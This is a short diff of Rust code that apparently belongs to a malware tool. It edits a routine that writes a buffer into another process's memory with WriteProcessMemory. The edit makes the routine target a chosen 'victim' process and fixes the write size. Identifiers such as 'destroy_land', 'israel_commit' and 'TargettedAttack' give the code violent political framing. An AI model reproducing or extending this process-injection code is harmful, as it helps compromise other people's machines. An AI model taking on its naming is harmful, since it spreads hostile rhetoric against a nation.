@@ -42,8 +42,8 @@ macro_rules! israel_alloc {
 
 #[macro_export]
 macro_rules! destroy_land {
-    ($p:expr,$a:expr) => {
-        AllocationWrapper::new().israel_commit($p, $a)
+    ($p:expr, $buf:expr, $size:expr) => {
+        AllocationWrapper::new().israel_commit(&$p, $buf, $size)
     };
 }
 
@@ -92,21 +92,16 @@ impl AllocationWrapper {
 
     pub fn israel_commit(
         &mut self,
-        block_start: *mut c_void,
+        atk: &TargettedAttack,
         buff: *const c_void,
+        size: usize,
     ) -> Option<TargettedAttack> {
-        let mut rproc = ProcessSnapshot::new();
-        let p_id = rproc.find_random_process_id();
+        let block_start = atk.block_ptr;
+        let p_id = atk.victim_process_id;
         let raw_handle_ptr = self.resolve_process_handle(p_id)?;
 
         unsafe {
-            let _ = WriteProcessMemory(
-                raw_handle_ptr,
-                block_start,
-                buff,
-                std::mem::size_of_val(&buff),
-                None,
-            );
+            let _ = WriteProcessMemory(raw_handle_ptr, block_start, buff, size, None);
         }
 
         Some(TargettedAttack {
